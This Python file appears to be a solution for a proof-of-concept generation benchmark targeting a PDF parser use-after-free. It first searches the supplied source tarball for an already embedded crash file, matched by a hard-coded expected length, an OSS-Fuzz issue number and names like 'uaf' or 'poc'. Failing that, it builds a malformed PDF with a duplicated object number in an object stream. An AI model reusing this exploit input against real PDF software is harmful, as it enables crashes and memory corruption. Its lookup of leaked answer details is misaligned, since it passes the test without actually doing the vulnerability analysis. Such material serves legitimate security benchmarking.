import tarfile
import gzip


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        ground_truth_len = 33453
        max_candidate_raw_size = 5 * 1024 * 1024  # 5 MB
        max_decompressed_size = 10 * ground_truth_len  # safety cap

        best_data = None
        best_score = None

        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return self._fallback_poc()

        try:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                if member.size <= 0 or member.size > max_candidate_raw_size:
                    continue

                name_lower = member.name.lower()

                try:
                    f = tf.extractfile(member)
                except Exception:
                    continue
                if f is None:
                    continue
                try:
                    raw = f.read()
                except Exception:
                    continue
                finally:
                    try:
                        f.close()
                    except Exception:
                        pass

                if not raw or len(raw) < 4:
                    continue

                # Handle gzip-compressed candidates
                if raw[:2] == b"\x1f\x8b" or name_lower.endswith(".gz"):
                    try:
                        data = gzip.decompress(raw)
                    except Exception:
                        continue
                else:
                    data = raw

                if not data or len(data) < 4:
                    continue
                if len(data) > max_decompressed_size:
                    continue

                # Require PDF header near the start
                if not (data.startswith(b"%PDF") or b"%PDF" in data[:16]):
                    continue

                # Scoring: prefer ground-truth length and indicative filenames
                score = 0.0
                score -= abs(len(data) - ground_truth_len)

                if "42535152" in name_lower:
                    score += 10000.0
                if "oss-fuzz" in name_lower:
                    score += 1000.0
                if "uaf" in name_lower or "use-after" in name_lower:
                    score += 500.0
                if "poc" in name_lower:
                    score += 200.0
                if name_lower.endswith(".pdf"):
                    score += 50.0
                if ".pdf" in name_lower:
                    score += 20.0

                if best_score is None or score > best_score:
                    best_score = score
                    best_data = data
        finally:
            try:
                tf.close()
            except Exception:
                pass

        if best_data is not None:
            return best_data

        # If we couldn't locate the embedded PoC, fall back to a synthetic PDF
        return self._fallback_poc()

    def _fallback_poc(self) -> bytes:
        """
        Fallback synthetic PDF attempting to exercise object stream handling.
        This is mainly a safety net if the real PoC is not embedded in the tarball.
        """
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

        obj_defs = []

        # 1: Catalog
        obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        obj_defs.append((1, obj1))

        # 2: Pages
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        obj_defs.append((2, obj2))

        # 3: Page
        obj3 = (
            b"<< /Type /Page /Parent 2 0 R "
            b"/MediaBox [0 0 612 792] "
            b"/Contents 4 0 R >>"
        )
        obj_defs.append((3, obj3))

        # 4: Simple content stream
        stream_content = b"BT /F1 24 Tf 100 700 Td (Hello from fallback PoC) Tj ET\n"
        length_str = str(len(stream_content)).encode("ascii")
        obj4 = (
            b"<< /Length " + length_str + b" >>\nstream\n" +
            stream_content +
            b"endstream"
        )
        obj_defs.append((4, obj4))

        # 5: Object stream with duplicate object number (6 0) entries
        inner_obj1 = b"<< /Dummy 1 >>"
        inner_obj2 = b"<< /Dummy 2 >>"

        first_obj_offset = 0
        second_obj_offset = len(inner_obj1) + 1  # account for newline separator

        header_text = b"6 0 6 " + str(second_obj_offset).encode("ascii") + b"\n"
        stream_body = header_text + inner_obj1 + b"\n" + inner_obj2
        first_val = str(len(header_text)).encode("ascii")
        length_stream = str(len(stream_body)).encode("ascii")

        obj5 = (
            b"<< /Type /ObjStm /N 2 /First " + first_val +
            b" /Length " + length_stream + b" >>\nstream\n" +
            stream_body + b"\nendstream"
        )
        obj_defs.append((5, obj5))

        # 6: Direct object with same id as in the object stream
        obj6 = b"<< /FromDirect 1 >>"
        obj_defs.append((6, obj6))

        body = header
        offsets = {}

        for objnum, objcontent in obj_defs:
            offsets[objnum] = len(body)
            body += (
                str(objnum).encode("ascii") +
                b" 0 obj\n" +
                objcontent +
                b"\nendobj\n"
            )

        maxobj = max(offsets.keys())
        xref_pos = len(body)

        # xref table
        entries = []
        entries.append("0000000000 65535 f \n")
        for i in range(1, maxobj + 1):
            off = offsets.get(i, 0)
            if off == 0:
                entries.append("0000000000 00000 f \n")
            else:
                entries.append(f"{off:010d} 00000 n \n")

        xref_header = f"xref\n0 {maxobj + 1}\n"
        xref_data = xref_header + "".join(entries)
        body += xref_data.encode("ascii")

        # trailer
        trailer = (
            "trailer\n"
            f"<< /Size {maxobj + 1} /Root 1 0 R >>\n"
            "startxref\n"
            f"{xref_pos}\n"
            "%%EOF\n"
        ).encode("ascii")

        body += trailer
        return body